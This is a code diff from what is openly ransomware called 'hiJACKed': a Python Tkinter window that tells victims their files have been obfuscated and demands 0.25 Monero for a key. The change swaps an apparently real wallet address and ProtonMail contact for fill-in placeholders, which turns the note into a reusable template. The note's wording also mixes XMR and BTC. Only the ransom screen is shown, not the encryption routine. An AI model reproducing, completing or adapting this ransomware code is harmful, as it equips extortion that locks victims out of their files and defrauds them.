@@ -95,7 +95,7 @@ master = Tk()
 master.geometry("1920x1080")
 label = Label(master,
 		text ="\n""\n""\n""\n"
-"You have been hiJACKed""\n""\n""\n""\n""Unfortunately you have fallen victim to a ransomware attack...""\n""\nAs such we have obfuscated all of your important files...""\n""\nTo recover your files you will need to send 0.25 $XMR to the following Crypto wallet!""\n""\n""\n""\n""\n""Wallet Address: 45zhoHambmrLqfBGnmov3AZwa6ru4sKB2PbHhafTqWuX4CMcT4TkS8MXi8VCHJynhoii8m3vFTU81SrxHF8mUStq8jTYXcD""\n""\n""\n""Once you have sent us the BTC""\n""\n""Please email a copy of your transaction ID to Nabalzbhfuvwnpxre@proton.me""\n""\n""With the following encrypted code...""\n""\n"+decodedkey)
+"You have been hiJACKed""\n""\n""\n""\n""Unfortunately you have fallen victim to a ransomware attack...""\n""\nAs such we have obfuscated all of your important files...""\n""\nTo recover your files you will need to send 0.25 $XMR to the following Crypto wallet!""\n""\n""\n""\n""\n""Wallet Address: Insert XMR Wallet Address Here""\n""\n""\n""Once you have sent us the BTC""\n""\n""Please email a copy of your transaction ID to Insert ProtonMail Email Here""\n""\n""With the following encrypted code...""\n""\n"+decodedkey)
 label.pack(pady = 5)
 master.title("hiJACKed")
 mainloop()
